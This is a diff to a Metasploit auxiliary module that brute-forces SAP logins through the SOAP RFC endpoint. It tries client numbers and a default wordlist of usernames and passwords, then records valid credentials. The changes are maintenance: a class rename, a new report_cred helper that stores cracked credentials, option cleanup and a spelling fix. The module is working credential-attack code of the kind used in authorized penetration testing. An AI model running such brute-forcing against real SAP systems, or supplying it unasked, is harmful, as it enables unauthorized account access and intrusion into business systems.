@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -14,10 +14,7 @@
 # provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -44,11 +41,13 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8000),
-        OptString.new('CLIENT', [true, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
+        OptString.new('CLIENT', [true, 'Client can be single (066), comma separated list (000,001,066) or range (000-999)', '000,001,066']),
         OptString.new('TARGETURI', [true, 'The base path to the SOAP RFC Service', '/sap/bc/soap/rfc']),
         OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
           File.join(Msf::Config.data_directory, "wordlists", "sap_default.txt") ])
-      ], self.class)
+      ])
+
+    deregister_options('HttpUsername', 'HttpPassword')
   end
 
   def run_host(rhost)
@@ -101,6 +100,33 @@ class Metasploit4 < Msf::Auxiliary
     end
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: Time.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def bruteforce(username,password,client)
     uri = normalize_uri(target_uri.path)
 
@@ -123,6 +149,7 @@ class Metasploit4 < Msf::Auxiliary
       'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{client}",
       'ctype' => 'text/xml; charset=UTF-8',
       'authorization' => basic_auth(username, password),
+      'encode_params' => false,
       'headers' =>
         {
           'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
@@ -131,15 +158,13 @@ class Metasploit4 < Msf::Auxiliary
 
     if res && res.code == 200 && res.body.include?('RFC_PING')
       print_good("#{peer} [SAP] Client #{client}, valid credentials #{username}:#{password}")
-      report_auth_info(
-        :host => rhost,
-        :port => rport,
-        :sname => "sap",
-        :proto => "tcp",
-        :user => username,
-        :pass => password,
-        :proof => "SAP Client: #{client}",
-        :active => true
+      report_cred(
+        ip: rhost,
+        port: rport,
+        service_name: 'sap',
+        user: username,
+        password: password,
+        proof: "SAP Client: #{client}"
       )
       return true
     end
